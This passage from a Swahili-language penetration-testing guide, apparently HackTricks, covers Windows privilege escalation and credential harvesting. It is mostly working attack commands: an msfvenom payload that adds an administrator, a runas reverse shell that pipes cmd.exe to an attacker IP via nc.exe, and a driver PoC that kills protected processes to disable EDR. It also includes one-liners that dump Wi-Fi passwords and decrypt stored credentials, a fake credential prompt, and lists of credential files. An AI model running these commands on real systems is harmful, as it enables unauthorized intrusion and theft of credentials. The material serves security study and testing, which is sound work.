Orodhesha njia zote za huduma zisizokuwa zimetajwa kwa nukuu, zisizojumuisha zile za built-in Windows services:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na exploit** udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda kwa mkono binary ya service na metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Urejesho

Windows inaruhusu watumiaji kubainisha hatua zitakazochukuliwa iwapo huduma itashindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwa binary. Ikiwa binary hii inaweza kubadilishwa, privilege escalation inaweza kuwa inawezekana. Maelezo zaidi yanapatikana katika the [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Programu

### Programu Zilizowekwa

Kagua **permissions of the binaries** (labda unaweza kuibadilisha moja na kisha escalate privileges) na za **folda** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia kama unaweza kubadilisha faili ya usanidi ili kusoma faili maalum au kama unaweza kubadilisha binary ambayo itaendeshwa na akaunti ya Administrator (schedtasks).

Njia ya kupata ruhusa dhaifu za folda/faili kwenye mfumo ni kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Uendelevu/Utekelezaji wa kuji-anzisha kwa plugin za Notepad++

Notepad++ hu- autoload DLL yoyote ya plugin ndani ya subfolders zake za `plugins`. Ikiwa kuna install ya portable/copy inayoweza kuandikwa, kuweka plugin ya uovu husababisha utekelezaji wa msimbo kiotomatiki ndani ya `notepad++.exe` kila mara inapoanzishwa (ikiwemo kutoka `DllMain` na plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Endesha wakati wa kuanzisha

**Angalia ikiwa unaweza kuandika tena registry au binary ambayo itatekelezwa na mtumiaji mwingine.**\
**Soma** ukurasa **ufuatao** ili ujifunze zaidi kuhusu maeneo ya kuvutia ya **autoruns ili kupandisha ruhusa**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Madereva

Tafuta madereva ya **wadau wa tatu isiyo ya kawaida/yenye udhaifu**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ikiwa driver inafunua arbitrary kernel read/write primitive (kawaida katika IOCTL handlers zisizoundwa vizuri), unaweza kupandisha hadhi kwa kuiba SYSTEM token moja kwa moja kutoka kernel memory. Angalia mbinu hatua‑kwa‑hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Kwa bugs za race-condition ambapo call iliyo dhaifu inafungua attacker-controlled Object Manager path, kupunguza kwa makusudi kasi ya lookup (kwa kutumia max-length components au deep directory chains) kunaweza kupanua window kutoka microseconds hadi kumi kadhaa za microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities zinakuwezesha kuandaa deterministic layouts, kutumia writable HKLM/HKU descendants, na kubadilisha metadata corruption kuwa kernel paged-pool overflows bila custom driver. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Baadhi ya signed third‑party drivers huunda device object yao na SDDL kali kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila bendera hii, secure DACL haiwezeshwi wakati device inafunguliwa kupitia path inayojumuisha component ya ziada, ikiruhusu mtumiaji asiye na ruhusa kupata handle kwa kutumia namespace path kama:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Mara mtumiaji anapoweza kufungua device, privileged IOCTLs zilizofunuliwa na driver zinaweza kutumiwa vibaya kwa LPE na tampering. Mfano wa uwezo uliotambuliwa katika mazingira halisi:
- Rudisha handles za full-access kwa mchakato wowote (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Kumaliza mchakato wowote, ikiwemo Protected Process/Light (PP/PPL), ikiruhusu AV/EDR kill kutoka user land via kernel.

Mfano mdogo wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Hatua za kupunguza kwa waendelezaji
- Daima weka FILE_DEVICE_SECURE_OPEN unapotengeneza device objects zinazokusudiwa kudhibitiwa na DACL.
- Thibitisha muktadha wa muombaji kwa operesheni zenye ruhusa. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa mchakato au kurudishwa kwa handles.
- Weka mipaka kwenye IOCTLs (vikwazo vya upatikanaji, METHOD_*, uthibitishaji wa pembejeo) na fikiria modeli za brokered badala ya kernel privileges za moja kwa moja.

Mapendekezo ya utambuzi kwa watetezi
- Fuatilia ufunguaji wa user-mode wa majina ya device yenye mashaka (e.g., \\ .\\amsdk*) na mfululizo maalum wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza blocklist ya Microsoft ya madereva hatarishi (HVCI/WDAC/Smart App Control) na tunza orodha zako za kuruhusu/kuzuia.


## PATH DLL Hijacking

If you have **ruhusa za kuandika ndani ya folda iliyo kwenye PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Kagua ruhusa za folda zote zilizoko kwenye PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kuutumia vibaya ukaguzi huu:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Mtandao

### Sehemu zilizoshirikiwa
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kompyuta nyingine zinazojulikana zilizo hardcoded kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Violesura vya Mtandao & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

Angalia kwa ajili ya **huduma zilizozuiliwa** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Routing
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Sheria za Firewall

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, unda sheria, zima, zima...)**

Zaidi[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Faili la binari `bash.exe` pia linaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata mtumiaji root, unaweza kusikiliza kwenye bandari yoyote (kwa mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye bandari, itakuuliza kupitia GUI kama `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanza bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` katika folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Vyeti vya Windows

### Vyeti vya Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Meneja wa Credentials / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault inahifadhi credentials za watumiaji kwa servers, websites na programu nyingine ambazo **Windows** inaweza **kuingia kwa watumiaji moja kwa moja**. Kwa muonekano wa kwanza, hii inaweza kuonekana kama watumiaji wanaweza kuhifadhi credentials zao za Facebook, Twitter, Gmail n.k., ili waingie moja kwa moja kupitia browsers. Lakini sivyo.

Windows Vault inahifadhi credentials ambazo Windows inaweza kutumia kuingia kwa watumiaji moja kwa moja, ambayo inamaanisha kwamba programu yoyote ya **Windows** inayohitaji credentials ili kupata rasilimali (server au tovuti) **inaweza kutumia Credential Manager** na Windows Vault na kutumia credentials zilizotolewa badala ya watumiaji kuingiza username na password kila mara.

Isipokuwa programu zinawasiliana na Credential Manager, sipati inawezekana kwao kutumia credentials za rasilimali fulani. Hivyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwa default storage vault.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` kwa chaguo la `/savecred` ili kutumia saved credentials. Mfano ufuatao unaitisha remote binary kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` na seti ya credential zilizotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kutoka [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** inatoa njia ya usimbaji fiche wa data kwa njia ya symmetric, inayotumika kwa kawaida ndani ya mfumo wa uendeshaji Windows kwa usimbaji fiche wa funguo binafsi za asymmetric. Usimbaji huu unatumia siri ya mtumiaji au ya mfumo ili kuongeza kwa kiasi kikubwa entropy.

**DPAPI inaruhusu usimbaji wa funguo kupitia funguo simetriki inayotokana na siri za kuingia za mtumiaji**. Katika matukio yanayohusisha usimbaji wa mfumo, inatumia siri za uthibitishaji za domain ya mfumo.

Funguo za RSA za mtumiaji zilizofichwa kwa kutumia DPAPI zinahifadhiwa katika saraka %APPDATA%\Microsoft\Protect\{SID}, ambapo {SID} inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **Funguo ya DPAPI, iliyoko pamoja na funguo mkuu inayolinda funguo binafsi za mtumiaji katika faili sawa**, kwa kawaida inajumuisha baiti 64 za data nasibu. (Ni muhimu kutambua kwamba ufikivu wa saraka hii umepunguzwa, ukizuia kuorodhesha yaliyomo kwa kutumia amri ya dir katika CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` na hoja zinazofaa (`/pvk` au `/rpc`) kuifungua.

Mafaili ya **credentials files protected by the master password** mara nyingi ziko katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili ku-decrypt.\
Unaweza **extract many DPAPI** **masterkeys** kutoka **memory** kwa kutumia module `sekurlsa::dpapi` (ikiwa wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** mara nyingi hutumika kwa ajili ya **scripting** na kazi za otomatiki kama njia ya kuhifadhi credentials zilizofichwa kwa urahisi. Credentials hizi zinalindwa kwa kutumia **DPAPI**, ambayo kwa kawaida ina maana kwamba zinaweza tu ku-decrypt na mtumiaji yule yule kwenye kompyuta ile ile zilipotengenezwa.

Ili **decrypt** PS credentials kutoka kwa faili inayohifadhi unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuzipata katika `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri Zilizotekelezwa Hivi Karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Meneja wa Nyaraka za Kuingia za Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia **Mimikatz** `dpapi::rdg` module pamoja na `/masterkey` inayofaa ili **kudekripti faili yoyote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye kumbukumbu kwa kutumia Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Watu mara nyingi hutumia app ya StickyNotes kwenye workstations za Windows **kuhifadhi nywila** na taarifa nyingine, bila kutambua kuwa ni faili ya database. Faili hii iko katika `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na daima inafaa kutafutwa na kuchunguzwa.

### AppCmd.exe

**Kumbuka kwamba ili kurejesha nywila kutoka AppCmd.exe unahitaji kuwa Administrator na kuendesha kwa High Integrity level.**\
**AppCmd.exe** iko katika `%systemroot%\system32\inetsrv\` saraka.\
Kama faili hii ipo basi kuna uwezekano kwamba baadhi ya **credentials** zimewekwa na zinaweza **kurejeshwa**.

Msimbo huu umetolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Wasakinishaji **huendeshwa kwa ruhusa za SYSTEM**, mengi yanaweza kuathiriwa na **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Mafaili na Rejista (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys katika rejista

SSH private keys zinaweza kuhifadhiwa ndani ya ufunguo wa rejista `HKCU\Software\OpenSSH\Agent\Keys` hivyo unapaswa kuangalia kama kuna kitu kinachovutia huko:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ikiwa utapata rekodi yoyote ndani ya njia hiyo, kuna uwezekano mkubwa ni ufunguo wa SSH uliohifadhiwa. Umehifadhiwa kwa usimbaji lakini unaweza kuufungua kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa boot, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya ssh keys, kuziweka kwa `ssh-add` na kuingia kupitia ssh kwenye mashine. Rejista HKCU\Software\OpenSSH\Agent\Keys haipo na procmon hakuona matumizi ya `dpapi.dll` wakati wa asymmetric key authentication.

### Faili zisizotazamwa
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Maudhui ya mfano:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Chelezo za SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Vyeti za Wingu
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili inayoitwa **SiteList.xml**

### Nenosiri la GPP lililohifadhiwa

Kipengele kilikuwepo hapo awali kilichoruhusu deployment ya akaunti maalum za local administrator kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, njia hii ilikuwa na mapungufu makubwa ya usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML katika SYSVOL, zilipatikana na mtumiaji yeyote wa domain. Pili, manenosiri ndani ya GPP hizi, yaliyofichwa kwa AES256 kwa kutumia default key iliyotangazwa hadharani, yanaweza kuwa decrypted na mtumiaji yeyote aliyethibitishwa. Hii ilisababisha hatari kubwa, kwa sababu inaweza kuruhusu watumiaji kupata privileges zilizoinuliwa.

Ili kupunguza hatari hii, function iliundwa kuchunguza faili za GPP zilizo locally cached ambazo zina shamba la "cpassword" lisilo tupu. Wakati faili kama hiyo inapopatikana, function hiyo decrypts nenosiri na inarejesha custom PowerShell object. Object hii inajumuisha maelezo kuhusu GPP na eneo la faili, ikisaidia katika utambuzi na remediation ya udhaifu huu wa usalama.

Tafuta katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ kwa faili hizi:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata nywila:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Usanidi wa Wavuti
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config yenye credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Taarifa za kuingia za OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Rekodi za Matukio
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Uliza kuhusu credentials

Unaweza kila wakati **kumuuliza user aingize credentials zake au hata credentials za user mwingine** ikiwa unaamini anaweza kuzijua (kumbuka kuwa **kumuuliza** client moja kwa moja kwa **credentials** ni hatari sana):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayoweza kuwa na credentials**

Faili zilizojulikana ambazo muda fulani uliopita ziliwahi kuwa na **passwords** kwa **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
